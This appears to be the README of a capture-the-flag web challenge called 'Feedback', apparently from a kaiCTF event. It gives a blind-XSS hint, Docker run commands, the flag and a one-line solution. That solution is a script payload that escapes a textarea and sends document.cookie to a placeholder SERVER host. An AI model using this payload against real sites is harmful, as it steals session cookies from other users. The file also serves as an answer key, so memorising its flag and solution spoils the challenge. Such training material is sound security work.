## Feedback

### Category
Web

### Points
medium/hard

### Task description
Ваше  мнение очень важно для нас.
@baydarich

### Flag
kaiCTF{c063c864e3fa3d802271ed5198f88118}

### Hint
blind xss

### Info

Go to `ready` folder and run:
```
docker build --tag blind-xss-task .
docker run -d -p 31337:31337 blind-xss-task
```

### Solution
```
</textarea><script>document.write('<img src="http://SERVER/?' + document.cookie + '"/>')</script>
```